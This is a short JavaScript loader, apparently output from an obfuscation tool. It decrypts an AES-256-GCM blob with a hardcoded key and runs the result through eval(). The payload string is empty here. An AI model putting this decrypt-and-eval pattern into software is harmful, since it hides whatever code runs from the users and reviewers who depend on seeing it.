// ENCRYPT XATANICVXII
const crypto = require('crypto');
const encryptedData = "";
const ivHex = "c7692c01a75ea7e6df2e741efa689b23";
const authTagHex = "2e138ec659d8e7f12ce15b5546128697";
const keyHex = "da18b4d790ae53c4b6b6fc93e48b871331c21bcf219cb4293eaff3ccfd9c391e";
const customAlgo = (name) => {
    const map = { 'GuwehXata': 'aes-256-gcm' };
    return map[name] || name;
};
const decipher = crypto.createDecipheriv(customAlgo('GuwehXata'), Buffer.from(keyHex, 'hex'), Buffer.from(ivHex, 'hex'));
decipher.setAuthTag(Buffer.from(authTagHex, 'hex'));
const decrypted = Buffer.concat([decipher.update(Buffer.from(encryptedData, 'hex')), decipher.final()]).toString('utf8');
eval(decrypted);